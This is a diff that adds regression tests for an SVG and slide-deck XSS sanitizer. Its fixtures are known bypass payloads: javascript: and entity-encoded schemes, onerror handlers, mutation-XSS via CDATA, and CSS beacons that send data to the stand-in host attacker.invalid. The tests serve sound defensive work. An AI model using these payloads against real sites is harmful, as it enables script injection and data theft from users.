@@ -904,6 +904,222 @@ uiSuite("Study Notes", [
   }},
 ]);
 
+// ── Security: SVG sanitizer bypass regression (v12.44) ───────────────
+// The svg block previously used a regex chain that let unquoted and
+// whitespace-obfuscated javascript: URIs through. These assert the
+// DOM-based sanitizeSvgMarkup() neutralizes the known bypasses.
+uiSuite("SVG Sanitizer (XSS)", [
+  { name: "Benign svg survives sanitization", fn: async () => {
+    const out = sanitizeSvgMarkup("<rect x='1' y='1' width='8' height='8' fill='#3b82f6'/>");
+    return out.includes("<rect") && out.includes("#3b82f6");
+  }},
+  { name: "Unquoted javascript: href stripped (or whole svg rejected)", fn: async () => {
+    const out = sanitizeSvgMarkup('<a href=javascript:alert(1)><text>x</text></a>');
+    return !/javascript:/i.test(out);
+  }},
+  { name: "Quoted javascript: href stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<a href="javascript:alert(1)"><text>x</text></a>');
+    return !/javascript:/i.test(out) && !/href\s*=/i.test(out.replace(/data-blocked-href/gi, ""));
+  }},
+  { name: "Whitespace-obfuscated scheme neutralized", fn: async () => {
+    const out = sanitizeSvgMarkup('<a href="java\tscript:alert(1)"><text>x</text></a>');
+    // either attr removed, or whitespace normalized so it is no longer a javascript scheme
+    return !/javascript:/i.test(out.replace(/\s+/g, ""));
+  }},
+  { name: "xlink:href javascript: stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<a xlink:href="javascript:alert(1)"><text>x</text></a>');
+    return !/javascript:/i.test(out);
+  }},
+  { name: "data: URI in href stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<image href="data:text/html,<script>alert(1)</script>" />');
+    return !/data:/i.test(out);
+  }},
+  { name: "Event handler attribute stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
+    return !/\bon\w+\s*=/i.test(out);
+  }},
+  { name: "script element stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
+    return !/<script/i.test(out);
+  }},
+  { name: "foreignObject element stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
+    return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
+  }},
+  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
+  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
+  // (preserve legitimate class-based styling and url(#fragment) refs that
+  // Mermaid/Vera diagrams need), and block <link> outright.
+  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
+    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
+    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
+    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
+  }},
+  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
+    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  }},
+  // v12.59 — string-source CSS image functions (no url() token) auto-fetch on
+  // render. image-set/image/cross-fade/src were the residual bypass of the
+  // v12.53 url()-only filter. Vela decks load NOTHING external.
+  { name: "SVG <style> image-set() string source removed (beacon blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>[x^="V"]{background:image-set("https://attacker.invalid/b?p=V" 1x)}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> -webkit-image-set / cross-fade / src() removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>a{background:-webkit-image-set("https://attacker.invalid/x" 1x)}b{x:cross-fade(url(#a),"https://attacker.invalid/y",50%)}c{x:src("https://attacker.invalid/z")}</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
+    const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG <feImage href> external removed (Roundcube class)", fn: async () => {
+    const out = sanitizeSvgMarkup('<filter><feImage href="https://attacker.invalid/b.png"/><feImage xlink:href="https://attacker.invalid/c.png"/></filter>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG #fragment paint refs + <a> https click-link preserved (v12.59)", fn: async () => {
+    const refs = sanitizeSvgMarkup('<rect fill="url(#grad)" clip-path="url(#c)"/>');
+    const link = sanitizeSvgMarkup('<a href="https://example.com/x"><text>hi</text></a>');
+    return /url\(#grad\)/.test(refs) && /url\(#c\)/.test(refs) && /href="https:\/\/example\.com\/x"/.test(link);
+  }},
+  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
+    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
+    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
+  }},
+  // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
+  // dangerouslySetInnerHTML does, and assert no live event handler materializes.
+  { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
+    const out = sanitizeSvgMarkup("<style><![CDATA[</style><img src=x onerror=alert(1)>]]" + "></style>");
+    const d = document.createElement("div"); d.innerHTML = out;
+    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
+  }},
+  { name: "CDATA-in-text mXSS round-trip neutralized", fn: async () => {
+    const out = sanitizeSvgMarkup("<text><![CDATA[</text><img src=x onerror=alert(1)>]]" + "></text>");
+    const d = document.createElement("div"); d.innerHTML = out;
+    return !_$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name)));
+  }},
+  { name: "Comment-node smuggling neutralized", fn: async () => {
+    const out = sanitizeSvgMarkup("<!--<img src=x onerror=alert(1)>-->");
+    const d = document.createElement("div"); d.innerHTML = out;
+    return !d.querySelector("img") && !/onerror/i.test(out);
+  }},
+  { name: "sanitizeUrl blocks javascript:/data:/vbscript:", fn: async () => {
+    return sanitizeUrl("javascript:alert(1)") === "" &&
+           sanitizeUrl("data:text/html,<script>alert(1)</script>") === "" &&
+           sanitizeUrl("vbscript:msgbox(1)") === "" &&
+           sanitizeUrl("https://example.com/x") === "https://example.com/x";
+  }},
+  { name: "item-level links sanitized by sanitizeBlock", fn: async () => {
+    const ir = sanitizeBlock({ type: "icon-row", items: [{ text: "x", link: "javascript:alert(1)" }] });
+    const fl = sanitizeBlock({ type: "flow", items: [{ label: "n", link: "javascript:alert(1)" }] });
+    return !ir.items[0].link && !fl.items[0].link;
+  }},
+  { name: "SMIL animate/animateTransform/animateMotion stripped", fn: async () => {
+    const a = sanitizeSvgMarkup('<a><animate attributeName="href" to="javascript:alert(1)" begin="0s"/><text>x</text></a>');
+    const t = sanitizeSvgMarkup('<rect><animateTransform attributeName="transform" type="rotate" onbegin="alert(1)"/></rect>');
+    const mo = sanitizeSvgMarkup('<rect><animateMotion onbegin="alert(1)" dur="1s"/></rect>');
+    return !/<animate/i.test(a) && !/<animatetransform/i.test(t) && !/<animatemotion/i.test(mo) && !/onbegin/i.test(t + mo);
+  }},
+  // Entity-encoded scheme: parser decodes &#58;/&#x3a;/&#115; before the scheme check runs
+  { name: "Entity-encoded javascript: scheme stripped (dec/hex/letter)", fn: async () => {
+    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
+      return _$$("a", d).some((a) => /^\s*javascript:/i.test((a.getAttribute("href") || "").replace(/\s/g, ""))); };
+    return !hasJsAnchor('<a href="javascript&#58;alert(1)"><text>x</text></a>') &&
+           !hasJsAnchor('<a href="javascript&#x3a;alert(1)"><text>x</text></a>') &&
+           !hasJsAnchor('<a href="java&#115;cript:alert(1)"><text>x</text></a>');
+  }},
+  // Regex-class bypasses: tag reconstruction + unclosed/incomplete tags → fail-closed empty output
+  { name: "Tag-reconstruction <scr<script>..ipt> neutralized", fn: async () => {
+    const out = sanitizeSvgMarkup("<scr<script></script>ipt>alert(1)</scr<script></script>ipt>");
+    const d = document.createElement("div"); d.innerHTML = out;
+    return !/<script/i.test(out) && !d.querySelector("script");
+  }},
+  { name: "Unclosed iframe/embed/script/foreignObject neutralized", fn: async () => {
+    const danger = (mk) => { const out = sanitizeSvgMarkup(mk); const d = document.createElement("div"); d.innerHTML = out;
+      return !!d.querySelector("iframe,embed,script,foreignObject") ||
+             _$$("*", d).some((el) => Array.from(el.attributes || []).some((a) => /^on/i.test(a.name))); };
+    return !danger('<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">') &&
+           !danger('<embed src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">') &&
+           !danger("<script>alert(1)") &&
+           !danger("<foreignObject><img src=x onerror=alert(1)>");
+  }},
+  { name: "vbscript: via xlink:href stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="vbscript:msgbox(1)"><text>x</text></a></svg>');
+    return !/vbscript:/i.test(out);
+  }},
+  // Mixed-case schemes — DOMParser preserves case in attribute values; the sanitizer
+  // must fold case before scheme comparison.
+  { name: "Mixed-case javascript:/data:/vbscript: schemes stripped", fn: async () => {
+    const hasJsAnchor = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
+      return _$$("a,image", d).some((el) => {
+        const v = (el.getAttribute("href") || el.getAttribute("xlink:href") || "").replace(/[\u0000-\u0020]/g, "").toLowerCase();
+        return v.startsWith("javascript:") || v.startsWith("data:") || v.startsWith("vbscript:"); }); };
+    return !hasJsAnchor('<a href="JaVaScRiPt:alert(1)"><text>x</text></a>') &&
+           !hasJsAnchor('<a href="JAVASCRIPT:alert(1)"><text>x</text></a>') &&
+           !hasJsAnchor('<a href="Data:text/html,<script>alert(1)</script>"><text>x</text></a>') &&
+           !hasJsAnchor('<a xlink:href="VbScript:msgbox(1)"><text>x</text></a>');
+  }},
+  // Allowlist enforcement — unexpected protocols (file:, blob:, chrome:, intent:) must be
+  // stripped after browser normalization, not just the historic js:/data:/vbscript: trio.
+  { name: "Unexpected protocols (file:/blob:/chrome:/intent:) stripped from href", fn: async () => {
+    const has = (mk, scheme) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
+      return _$$("a", d).some((el) => (el.getAttribute("href") || "").toLowerCase().startsWith(scheme)); };
+    return !has('<a href="file:///etc/passwd"><text>x</text></a>', "file:") &&
+           !has('<a href="blob:https://x/abc"><text>x</text></a>', "blob:") &&
+           !has('<a href="chrome://settings"><text>x</text></a>', "chrome:") &&
+           !has('<a href="intent://x"><text>x</text></a>', "intent:");
+  }},
+  // Allowlisted schemes + fragment + relative must SURVIVE the allowlist (regression guard).
+  { name: "Allowlisted href schemes preserved (http/https/mailto/tel/#frag/relative)", fn: async () => {
+    const keptHref = (mk) => { const d = document.createElement("div"); d.innerHTML = sanitizeSvgMarkup(mk);
+      const a = d.querySelector("a"); return a && a.getAttribute("href"); };
+    return !!keptHref('<a href="https://example.com/x"><text>x</text></a>') &&
+           !!keptHref('<a href="http://example.com/x"><text>x</text></a>') &&
+           !!keptHref('<a href="mailto:a@b.c"><text>x</text></a>') &&
+           !!keptHref('<a href="tel:+15551234"><text>x</text></a>') &&
+           !!keptHref('<a href="#anchor"><text>x</text></a>') &&
+           !!keptHref('<a href="path/to/x.svg"><text>x</text></a>');
+  }},
+]);
+
+// ── Security: deck-level sanitization (fail-closed + clamp + IMPORT_CONCEPTS) ──
+uiSuite("Deck Sanitization (XSS)", [
+  { name: ">50 lanes clamps to 50 without throwing (no fail-open trigger)", fn: async () => {
+    const lanes = []; for (let i = 0; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
+    let threw = false, res = null;
+    try { res = validateAndSanitizeDeck({ deckTitle: "x", lanes }); } catch (e) { threw = true; }
+    return !threw && res && res.lanes.length === 50;
+  }},
+  { name: "Large deck still sanitizes item-level javascript: link", fn: async () => {
+    const lanes = [{ title: "L0", items: [{ title: "m", slides: [{ blocks: [
+      { type: "icon-row", items: [{ text: "Click", link: "javascript:alert(1)" }] }] }] }] }];
+    for (let i = 1; i < 60; i++) lanes.push({ title: "L" + i, items: [] });
+    const res = validateAndSanitizeDeck({ deckTitle: "x", lanes });
+    const ir = res.lanes[0].items[0].slides[0].blocks.find((b) => b.type === "icon-row");
+    return !!ir && !ir.items[0].link;
+  }},
+  { name: "Non-whitelisted block type dropped by sanitizeBlock", fn: async () => {
+    return sanitizeBlock({ type: "NOT_A_BLOCK", evil: true }) === null;
+  }},
+]);
+
 // ── v10: Gallery View Suite ──────────────────────────────────────────
 uiSuite("Gallery View", [
   { name: "Enter fullscreen for gallery tests", fn: async () => {
